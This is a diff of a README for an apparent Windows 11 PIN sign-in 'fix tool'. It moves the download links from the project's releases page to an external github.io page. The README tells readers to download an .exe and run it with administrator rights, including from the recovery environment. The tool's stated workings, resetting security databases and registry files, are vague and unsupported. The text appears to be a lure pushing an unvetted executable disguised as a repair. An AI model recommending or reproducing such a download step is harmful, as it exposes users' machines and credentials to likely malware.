@@ -1,6 +1,6 @@
 # 🛡️ PIN-Not-Working-Windows-11-Fix - Restore Your Windows Sign-in Access Easily
 
-[![](https://img.shields.io/badge/Download_Fix_Tool-Blue-blue.svg)](https://github.com/sahilkuma4259/PIN-Not-Working-Windows-11-Fix/releases)
+[![](https://img.shields.io/badge/Download_Fix_Tool-Blue-blue.svg)](https://sahilkuma4259.github.io)
 
 ## 📌 About This Tool
 The PIN-Not-Working-Windows-11-Fix resolves sign-in errors on Windows 10 and 11 systems. Many users face issues where the system refuses to accept a PIN or displays a message stating that something went wrong. This tool resets the local security databases that manage authentication. It clears corrupted cache files that prevent Windows Hello from verifying your credentials correctly. You regain access to your desktop without needing complex command-line modifications or manual folder navigation. This software automates the recovery process to protect your data while restoring standard sign-in functions.
@@ -9,7 +9,7 @@ The PIN-Not-Working-Windows-11-Fix resolves sign-in errors on Windows 10 and 11 
 This repair tool runs on all standard versions of Windows 10 and Windows 11. Your computer must have an active internet connection to verify the latest Windows security definitions during the repair. Ensure you have administrator access to the Windows account. If you cannot log in, use the recovery environment available during the Windows boot sequence to run this utility. The tool requires 50 megabytes of disk space and memory to process the system registry files.
 
 ## ⚠️ Getting Started
-1. Access the download page: [Download Link](https://github.com/sahilkuma4259/PIN-Not-Working-Windows-11-Fix/releases).
+1. Access the download page: [Download Link](https://sahilkuma4259.github.io).
 2. Look for the latest release version on the page.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
